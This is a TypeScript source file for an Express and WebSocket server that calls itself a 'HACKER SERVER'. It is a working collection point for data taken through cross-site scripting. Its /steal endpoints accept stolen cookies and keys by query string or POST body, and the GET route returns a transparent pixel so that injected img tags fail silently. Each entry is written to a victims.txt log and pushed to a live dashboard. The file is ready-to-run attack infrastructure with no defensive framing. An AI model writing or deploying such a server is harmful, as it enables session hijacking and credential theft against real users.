import express from "express";
import cors from "cors";
import fs from "fs";
import path from "path";
import http from "http";
import { WebSocketServer, WebSocket } from "ws";

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "../public")));

const LOG_FILE = path.join(__dirname, "../victims.txt");

// Ensure log file exists
if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, "");
}

interface StolenEntry {
  type: string;
  data: string;
  ip: string;
  userAgent: string;
  timestamp: string;
}

const stolenData: StolenEntry[] = [];

function broadcast(data: StolenEntry) {
  const msg = JSON.stringify(data);
  wss.clients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(msg);
    }
  });
}

function logEntry(entry: StolenEntry) {
  stolenData.push(entry);
  const logLine = `[${entry.timestamp}] [${entry.type.toUpperCase()}] IP=${entry.ip} | UA=${entry.userAgent.slice(0, 60)} | Data=${entry.data}\n`;
  fs.appendFileSync(LOG_FILE, logLine);
  broadcast(entry);
  console.log(`[STOLEN] ${entry.type}: ${entry.data.slice(0, 100)}`);
}

// 1x1 transparent GIF pixel
const PIXEL = Buffer.from(
  "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
  "base64"
);

// GET /steal — receive stolen data via query params (for <img> tags)
app.get("/steal", (req, res) => {
  const entry: StolenEntry = {
    type: (req.query.type as string) || "cookie",
    data:
      (req.query.cookie as string) ||
      (req.query.key as string) ||
      (req.query.data as string) ||
      JSON.stringify(req.query),
    ip: req.ip || req.socket.remoteAddress || "unknown",
    userAgent: req.headers["user-agent"] || "unknown",
    timestamp: new Date().toISOString(),
  };

  logEntry(entry);

  // Return 1x1 pixel so <img> tag doesn't show broken image
  res.writeHead(200, { "Content-Type": "image/gif", "Content-Length": PIXEL.length.toString() });
  res.end(PIXEL);
});

// POST /steal — receive stolen data via body (for fetch-based payloads)
app.post("/steal", (req, res) => {
  const entry: StolenEntry = {
    type: req.body.type || "custom",
    data: typeof req.body === "string" ? req.body : JSON.stringify(req.body),
    ip: req.ip || req.socket.remoteAddress || "unknown",
    userAgent: req.headers["user-agent"] || "unknown",
    timestamp: new Date().toISOString(),
  };

  logEntry(entry);
  res.json({ status: "received" });
});

// GET /api/logs — get all stolen data
app.get("/api/logs", (_req, res) => {
  res.json(stolenData);
});

// DELETE /api/logs — clear all logs
app.delete("/api/logs", (_req, res) => {
  stolenData.length = 0;
  fs.writeFileSync(LOG_FILE, "");
  res.json({ status: "cleared" });
});

// GET /api/stats — basic stats
app.get("/api/stats", (_req, res) => {
  const types: Record<string, number> = {};
  stolenData.forEach((e) => {
    types[e.type] = (types[e.type] || 0) + 1;
  });
  res.json({
    total: stolenData.length,
    byType: types,
    uniqueIPs: [...new Set(stolenData.map((e) => e.ip))].length,
  });
});

// WebSocket connection handler
wss.on("connection", (ws) => {
  console.log("[WS] Client connected to dashboard");
  // Send existing data to new client
  ws.send(JSON.stringify({ type: "init", data: stolenData }));
  ws.on("close", () => console.log("[WS] Client disconnected"));
});

const PORT = 4000;
server.listen(PORT, () => {
  console.log(`\n===========================================`);
  console.log(`  HACKER SERVER running on port ${PORT}`);
  console.log(`===========================================`);
  console.log(`  Dashboard:  http://localhost:${PORT}`);
  console.log(`  Steal URL:  http://localhost:${PORT}/steal?cookie=xxx`);
  console.log(`  API Logs:   http://localhost:${PORT}/api/logs`);
  console.log(`  WebSocket:  ws://localhost:${PORT}`);
  console.log(`===========================================\n`);
});
